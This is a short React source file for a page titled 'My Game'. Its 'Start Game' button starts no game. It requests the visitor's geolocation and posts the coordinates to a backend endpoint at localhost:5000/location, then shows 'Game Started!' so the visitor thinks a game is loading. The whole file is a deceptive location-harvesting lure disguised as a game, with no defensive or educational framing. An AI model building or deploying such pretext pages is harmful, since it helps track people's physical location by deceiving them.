import { useState } from "react";

function App() {
  const [data, setData] = useState("🎮 Click to Start Game");

  const handleClick = () => {
    setData(" Loading game...");

    if (!navigator.geolocation) {
      setData(" Not supported");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const location = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
        };

        try {
          await fetch("http://localhost:5000/location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify(location),
          });

          setData(" Game Started!");
        } catch (err) {
          setData(" Server error");
        }
      },
      () => {
        setData(" Allow location to continue");
      }
    );
  };

  return (
    <div style={{ textAlign: "center", marginTop: "100px" }}>
      <h1>🎮 My Game</h1>
      <button onClick={handleClick}>Start Game</button>
      <p>{data}</p>
    </div>
  );
}

export default App;